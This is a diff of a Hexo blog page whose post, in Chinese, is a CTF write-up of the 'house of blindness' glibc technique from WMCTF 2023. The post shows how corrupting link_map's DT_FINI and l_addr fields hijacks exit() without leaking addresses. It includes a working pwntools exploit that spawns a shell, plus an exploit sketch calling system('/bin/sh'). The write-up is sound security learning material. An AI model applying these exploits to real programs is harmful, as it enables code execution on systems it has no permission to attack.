@@ -1,48 +1,153 @@
 <!DOCTYPE html>
-<html>
-    <head>
-    <meta charset="utf-8">
-    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
-    <link rel="alternate icon" type="image/png" href="/img/favicon.png">
-    <title>Loora1N&#39;s Blog | 鹭雨 | </title>
-    
-<link rel="stylesheet" href="/css/reset.css">
+<html lang="zh-CN">
+  <head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
 
-    
-<link rel="stylesheet" href="/css/style.css">
+    <meta name="author" content="Loora1N">
 
-    
-<link rel="stylesheet" href="/css/markdown.css">
 
-    
-<link rel="stylesheet" href="/css/fonts.css">
 
-<meta name="generator" content="Hexo 6.2.0"></head>
-    <body>
-        <div class="paper">
-            <div class="paper-main">
-                
-                    <div class="post-header">
-    <a class="logo" href="/">Loora1N&#39;s Blog | 鹭雨</a>
-    <a class="go-home" href="/">
-        <svg width="8" height="14" viewBox="0 0 8 14">
-            <path d="M7 1L1 7l6 6" stroke="#000" stroke-width="2" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"/>
-        </svg>
-    </a>
+    <meta name="description" content="Blog of Loora1N">
+
+
+
+
+
+<title>【trick】house of blindness | Loora1N&#39;s Blog | 鹭雨</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Noto+Sans+SC:wght@300;400;500;700&family=Roboto+Mono&display=swap');
+</style>
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/menu.js"></script>
+    
+    <script src="/js/highlight.min.js"></script>
+    
+    <script src="/js/highlightjs-line-numbers.js"></script>
+    
+    <script src="/js/format.js"></script>
+    
+    <script src="/js/search.js"></script>
+    
+
+
+
+
+
+
+
+
+
+
+  <meta name="generator" content="Hexo 6.2.0"></head>
+  <body>
+    <div class="mask-border">
+    </div>
+
+    <div class="wrapper">
+
+      <div class="header">
+  <div class="flex-container">
+    <div class="header-inner">
+      <div class="site-brand-container">
+        <a href="/">
+          
+            Loora1N&#39;s Blog | 鹭雨
+          
+        </a>
+      </div>
+      <div id="menu-btn" class="menu-btn" onclick="toggleMenu()">
+        Menu
+      </div>
+      <nav class="site-nav">
+        <ul class="menu-list">
+          
+            
+              <li class="menu-item">
+                <a href="/">首页</a>
+              </li> 
+                   
+          
+            
+              <li class="menu-item">
+                <a href="/archives/">索引</a>
+              </li> 
+                   
+          
+            
+              <li class="menu-item">
+                <a href="/about/">述己</a>
+              </li> 
+                   
+          
+            
+              <li class="menu-item">
+                <a href="/links/">友链</a>
+              </li> 
+                   
+          
+          
+            <li class="menu-item search-btn">
+              <a href="#">Search</a>
+            </li>
+          
+        </ul>
+      </nav>
+    </div>
+  </div>
 </div>
-                
-                <div class="post-main">
 
-    
-    
-        <div class="post-main-title">
-            【trick】house of blindness
+
+      <div class="main">
+        <div class="flex-container">
+          <article id="post">
+
+  
+    <div class="post-head">
+    <div class="post-info">
+        <div class="tag-list">
+            
         </div>
-        <div class="post-meta">
-            2023-09-07
+        <div class="post-title">
+            
+            
+                【trick】house of blindness
+            
+            
         </div>
-        <div class="post-md">
-            <blockquote>
+        <span class="post-date">
+            9月 7, 2023
+        </span>
+    </div>
+    <div class="post-img">
+        
+            <div class="h-line-primary"></div>
+              
+    </div>
+</div>
+    <div class="post-content">
+    <blockquote>
 <p>在WMCTF 2023官方wp中，看到了一个十分新奇的手法house of blindness. 其无需leak地址却仍然能够hijack程序流，这里做以学习研究。本文例题使用WMCTF2023 blindness</p>
 <p>参考文章: <a target="_blank" rel="noopener" href="https://hackmd.io/jmE0VvcTQaaJm6SEWiqUJA">issues in exit town - HackMD</a></p>
 </blockquote>
@@ -62,36 +167,11 @@
 <p>其中我们需要关注下<code>DT_FINI</code>这个tag，也就是gdb中显示的<code>FINI</code>，其代表了<code>fini</code>函数到程序加载的虚拟地址的offset，即<code>real_fini_addr = code_base + DT_FINI</code>，以本题为例我们可以得到</p>
 <p><img src="/img/article/blindness/image-20230907143044385.png" alt="image-20230907143044385"></p>
 <p>在<code>exit()</code>函数的源码中，我们可以看到如下部分：</p>
-<pre><code class="c">/* Is there a destructor function?  */
-if (l-&gt;l_info[DT_FINI_ARRAY] != NULL
-    || l-&gt;l_info[DT_FINI] != NULL)
-  &#123;
-    /* When debugging print a message first.  */
-    if (__builtin_expect (GLRO(dl_debug_mask)
-                          &amp; DL_DEBUG_IMPCALLS, 0))
-      _dl_debug_printf (&quot;\ncalling fini: %s [%lu]\n\n&quot;,
-                        DSO_FILENAME (l-&gt;l_name),
-                        ns);
-    /* First see whether an array is given.  */
-    if (l-&gt;l_info[DT_FINI_ARRAY] != NULL)
-      &#123;
-        ElfW(Addr) *array =
-          (ElfW(Addr) *) (l-&gt;l_addr
-                          + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);
-        unsigned int i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val
-                          / sizeof (ElfW(Addr)));
-        while (i-- &gt; 0)
-          ((fini_t) array[i]) ();
-      &#125;
-    /* Next try the old-style destructor.  */
-    if (l-&gt;l_info[DT_FINI] != NULL)
-      DL_CALL_DT_FINI
-        (l, l-&gt;l_addr + l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr);
-  &#125;
-</code></pre>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Is there a destructor function?  */</span></span><br><span class="line"><span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span></span><br><span class="line">    || l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* When debugging print a message first.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (GLRO(dl_debug_mask)</span><br><span class="line">                          &amp; DL_DEBUG_IMPCALLS, <span class="number">0</span>))</span><br><span class="line">      _dl_debug_printf (<span class="string">&quot;\ncalling fini: %s [%lu]\n\n&quot;</span>,</span><br><span class="line">                        DSO_FILENAME (l-&gt;l_name),</span><br><span class="line">                        ns);</span><br><span class="line">    <span class="comment">/* First see whether an array is given.  */</span></span><br><span class="line">    <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        ElfW(Addr) *<span class="built_in">array</span> =</span><br><span class="line">          (ElfW(Addr) *) (l-&gt;l_addr</span><br><span class="line">                          + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">                          / <span class="keyword">sizeof</span> (ElfW(Addr)));</span><br><span class="line">        <span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">          ((<span class="type">fini_t</span>) <span class="built_in">array</span>[i]) ();</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="comment">/* Next try the old-style destructor.  */</span></span><br><span class="line">    <span class="keyword">if</span> (l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>)</span><br><span class="line">      DL_CALL_DT_FINI</span><br><span class="line">        (l, l-&gt;l_addr + l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
 <p>其中最下方的<code>DL_CALL_DT_FINI(l, l-&gt;l_addr + l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr);</code>便是调用<code>_fini</code>函数的部分，宏定义如下</p>
-<pre><code class="c"># define DL_CALL_DT_FINI(map, start) ((fini_t) (start)) ()
-</code></pre>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> DL_CALL_DT_FINI(map, start) ((fini_t) (start)) ()</span></span><br></pre></td></tr></table></figure>
+
 <p>而<code>l_addr</code>和<code>l_info[DT_FINI]</code>正对应这我们前面谈到的codebase和.dynamic节上的偏移，l为在ld中存放的link_map结构</p>
 <p>以本题为例，我们用gdb跟踪exit流。可以发现，在调用完<code>__do_global_dtors_aux</code>之后，程序流便会通过r15，来调用<code>fini</code>，如图</p>
 <p><img src="/img/article/blindness/image-20230907154901922.png" alt="image-20230907154901922"></p>
@@ -106,32 +186,16 @@ if (l-&gt;l_info[DT_FINI_ARRAY] != NULL
 <p><img src="/img/article/blindness/image-20230907160909407.png" alt="image-20230907160909407"></p>
 <p>此时rdi参数恰好也是ld中的一个指针，另外还需要劫持<code>fini_array</code>为空，防止由于指针更改出现crash</p>
 <p>原作者给出了exp的大致形式如下:</p>
-<pre><code class="python"># disable fini array from exec
-write(ld.address + link_map + l_info + 8 * DT_FINI_ARRAY, p64(0))
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># disable fini array from exec</span></span><br><span class="line">write(ld.address + link_map + l_info + <span class="number">8</span> * DT_FINI_ARRAY, p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># overwrite l_info[DT_FINI]&#x27;s lsb so that it points to _r_debug</span></span><br><span class="line">write(ld.address + link_map + l_info + <span class="number">8</span> * DT_FINI, <span class="string">b&quot;\xb8&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># overwrite l_addr with offset to bring _r_debug to system</span></span><br><span class="line">write(</span><br><span class="line">    ld.address + link_map,</span><br><span class="line">    p64(libc.symbols[<span class="string">&quot;system&quot;</span>] - ld.symbols[<span class="string">&quot;_r_debug&quot;</span>], signed=<span class="literal">True</span>),</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fill _dl_load_lock with /bin/sh</span></span><br><span class="line">write(ld.symbols[<span class="string">&quot;_rtld_global&quot;</span>] + _dl_load_lock, <span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br></pre></td></tr></table></figure>
 
-# overwrite l_info[DT_FINI]&#39;s lsb so that it points to _r_debug
-write(ld.address + link_map + l_info + 8 * DT_FINI, b&quot;\xb8&quot;)
-
-# overwrite l_addr with offset to bring _r_debug to system
-write(
-    ld.address + link_map,
-    p64(libc.symbols[&quot;system&quot;] - ld.symbols[&quot;_r_debug&quot;], signed=True),
-)
-
-# fill _dl_load_lock with /bin/sh
-write(ld.symbols[&quot;_rtld_global&quot;] + _dl_load_lock, b&quot;/bin/sh\x00&quot;)
-</code></pre>
 <p>总结一下利用条件：</p>
 <ul>
 <li>malloc的size不限制大小，比如可以<code>malloc(0x100000)</code></li>
 <li>可以在malloc出的chunk附近实现越界的任意写</li>
 </ul>
 <p>作者给出的利用条件的形式如下</p>
-<pre><code class="c">// get size from user
-char *chunk = malloc(size);
-// get idx and byte from the user
-chunk[idx] = byte;
-</code></pre>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// get size from user</span></span><br><span class="line"><span class="type">char</span> *chunk = <span class="built_in">malloc</span>(size);</span><br><span class="line"><span class="comment">// get idx and byte from the user</span></span><br><span class="line">chunk[idx] = byte;</span><br></pre></td></tr></table></figure>
+
 <h2 id="WMCTF-blindness"><a href="#WMCTF-blindness" class="headerlink" title="WMCTF blindness"></a>WMCTF blindness</h2><p>WMCTF的这道例题也使用了类似的思想，不过手法并不完全相同，并非利用<code>DT_DEBUG</code>. 我们可以再看一眼本题的.dynamic标签的地址分布</p>
 <p><img src="/img/article/blindness/image-20230907142646702.png" alt="image-20230907142646702"></p>
 <p>可以注意到<code>DT_FINI</code>的地址为0x3DB8，<code>DT_DEBUG</code>的地址为0x3E58，即如果我们考虑原作者的思路。则需要覆盖2个byte，即仍需1&#x2F;16的爆破。但是我们注意到，本题是存在后门<code>backdoor</code>的，那么我们可以控制<code>l_info[DT_FINI]</code>为一个text段的函数，然后利用l_addr偏移至后门即可。可以看到.dynamic上面的一个标签<code>__frame_dummy_init_array_entry</code></p>
@@ -139,72 +203,101 @@ chunk[idx] = byte;
 <p>且恰好后门函数和该函数只有0x9的偏移，如图。那么我们就可以覆盖l_info[DT_FINI]的最低字节从0xB8到0x80，然后控制l_addr偏移为9，从而执行后门函数.</p>
 <p><img src="/img/article/blindness/image-20230907173108919.png" alt="image-20230907173108919"></p>
 <p>官方exp如下，估计出题人套了自己的板子，因而注释与代码并不匹配，这里并非利用DT_DEBUG。且劫持参数为<code>/bin/sh</code>也是无必要的</p>
-<pre><code class="python">#!/usr/bin/env python
-# -*- coding: utf-8 -*-
-import sys
-import os
-from pwn import *
-from ctypes import *
-#context.log_level = &#39;debug&#39;
-def write(addr,content):
-    content = list(content)
-    payload = &quot;@&quot; + p32(addr)
-    for i in range(len(content)):
-        payload += &#39;.&#39; + p8(ord(content[i]))
-        payload += &#39;&gt;&#39;
-    return payload
-def exp():
-    p.recv()
-    p.send(str(0x100000))
-    p.recv()
-    p.send(str(0x100))
-    p.recv()
-    payload = write(0x33f958 - 0x1c000,&quot;/bin/sh;&quot;) #劫持参数
-    payload += write(0x340180-0x33f958-0x8,p64(0x9)) #将l_addr改为DT_DEBUg和system函数的差值
-    payload += write(0x340228-0x340180-0x8,p8(0x88-0x8)) #劫持DT_FINI指向DT_DEBUG
-    payload += write(0x340290-0x340228 - 0x1,p64(0)) #使得DT_FINI_ARRAY为NULL
-    payload += &#39;q&#39;
-    p.send(payload)
-    p.interactive()
-if __name__ == &quot;__main__&quot;:
-    binary = &#39;./main&#39;
-    elf = ELF(&#39;./main&#39;)
-    context.binary = binary
-    if(len(sys.argv) == 3):
-        p = remote(sys.argv[1],sys.argv[2])
-    else:
-        p = process(binary)
-    exp()
-</code></pre>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">addr,content</span>):</span><br><span class="line">    content = <span class="built_in">list</span>(content)</span><br><span class="line">    payload = <span class="string">&quot;@&quot;</span> + p32(addr)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(content)):</span><br><span class="line">        payload += <span class="string">&#x27;.&#x27;</span> + p8(<span class="built_in">ord</span>(content[i]))</span><br><span class="line">        payload += <span class="string">&#x27;&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    p.recv()</span><br><span class="line">    p.send(<span class="built_in">str</span>(<span class="number">0x100000</span>))</span><br><span class="line">    p.recv()</span><br><span class="line">    p.send(<span class="built_in">str</span>(<span class="number">0x100</span>))</span><br><span class="line">    p.recv()</span><br><span class="line">    payload = write(<span class="number">0x33f958</span> - <span class="number">0x1c000</span>,<span class="string">&quot;/bin/sh;&quot;</span>) <span class="comment">#劫持参数</span></span><br><span class="line">    payload += write(<span class="number">0x340180</span>-<span class="number">0x33f958</span>-<span class="number">0x8</span>,p64(<span class="number">0x9</span>)) <span class="comment">#将l_addr改为DT_DEBUg和system函数的差值</span></span><br><span class="line">    payload += write(<span class="number">0x340228</span>-<span class="number">0x340180</span>-<span class="number">0x8</span>,p8(<span class="number">0x88</span>-<span class="number">0x8</span>)) <span class="comment">#劫持DT_FINI指向DT_DEBUG</span></span><br><span class="line">    payload += write(<span class="number">0x340290</span>-<span class="number">0x340228</span> - <span class="number">0x1</span>,p64(<span class="number">0</span>)) <span class="comment">#使得DT_FINI_ARRAY为NULL</span></span><br><span class="line">    payload += <span class="string">&#x27;q&#x27;</span></span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.interactive()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    binary = <span class="string">&#x27;./main&#x27;</span></span><br><span class="line">    elf = ELF(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">    context.binary = binary</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">len</span>(sys.argv) == <span class="number">3</span>):</span><br><span class="line">        p = remote(sys.argv[<span class="number">1</span>],sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = process(binary)</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>
 
+
+</div> 
+
+<script>
+    window.onload = detectors();
+</script>
+    <div class="post-footer">
+    <div class="h-line-primary"></div>
+    <nav class="post-nav">
+        <div class="prev-item">
+           
+                <div class="icon arrow-left"></div>
+                <div class="post-link">
+                    <a href="/2023/09/11/%E3%80%90Kernel%E3%80%91Linux%20Huge%20Pages/">Prev</a>
+                </div>
+            
         </div>
+        <div class="next-item">
+            
+                <div class="icon arrow-right"></div>
+                <div class="post-link">
+                  <a href="/2023/09/04/%E3%80%90fuzz%E3%80%91AFL%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%20part%202/">Next</a>  
+                </div>  
+            
+        </div>
+    </nav>
+</div>
 
+    
+      <div class="post-comment">
+
+     
+
+     
+    
     
 
 </div>
-                <div class="footer">
-    <span>Copyright © 2022 Loora1N&#39;s Blog | 鹭雨</span>
-    <span>Theme Designed By <a target="_blank" href="https://zheli.design/one-paper">這李設計</a></span>
+     
+  
+</article>
+        </div>
+      </div>
+      
+      <div class="footer">
+    <div class="flex-container">
+        <div class="footer-text">
+            
+            
+            
+                Powered by <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> & <a target="_blank" rel="noopener" href="https://github.com/zoeingwingkei/frame/">Frame</a>
+                
+        </div>
+    </div>
 </div>
 
+    </div>
 
-<link rel="stylesheet" href="/css/a11y-dark.min.css">
-
-
-<script src="/js/highlight.min.js"></script>
-
-
-<script src="/js/highlightjs-line-numbers.js"></script>
-
-
-<script>
-    hljs.initHighlightingOnLoad();
-    hljs.initLineNumbersOnLoad();
-</script>
-
+    
+      <div class="search-popup">
+    <div class="search-popup-overlay">  
+    </div>
+    <div class="search-popup-window" >
+        <div class="search-header">
+            <div class="search-input-container">
+              <input autocomplete="off" autocapitalize="off" maxlength="80"
+                     placeholder="Search Anything" spellcheck="false"
+                     type="search" class="search-input">
+            </div>
+            <div class="search-close-btn">
+                <div class="icon close-btn"></div>
             </div>
         </div>
-    <!-- hexo injector body_end start -->
+        <div class="search-result-container">
+        </div>
+    </div>
+</div>
+
+<script>
+    const searchConfig = {
+        path             : "/search.xml",
+        top_n_per_article: "1",
+        unescape         : "false",
+        trigger: "auto",
+        preload: "false"
+    }
+</script>
+<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js"></script>
+<script src="/js/search.js"></script>
+    
+    
+
+  <!-- hexo injector body_end start -->
   <script data-pjax src="https://cdn.jsdelivr.net/gh/Zfour/hexo-github-calendar@1.21/hexo_githubcalendar.js"></script>
   <script data-pjax>
         function GithubCalendarConfig(){
